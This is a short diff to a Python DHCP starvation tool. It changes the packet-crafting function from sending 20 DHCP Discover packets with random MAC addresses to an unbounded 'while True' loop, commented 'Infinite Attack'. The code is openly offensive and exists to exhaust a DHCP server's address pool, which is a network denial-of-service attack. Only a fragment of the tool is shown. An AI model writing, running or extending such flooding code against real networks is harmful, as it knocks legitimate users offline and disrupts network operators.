@@ -66,7 +66,9 @@ class DHCPStarvation(object):
 
 def craft_dhcp_pkt():
     """ Crafting DHCP Discover Packet Starvation Attack """
-    for i in range(20):
+    
+    # Infinite Attack
+    while True:
         print("[*] Crafting DHCP Discover Packet")
         random_mac = RandMAC()
         packet = DHCPStarvation(iface=IFACE,
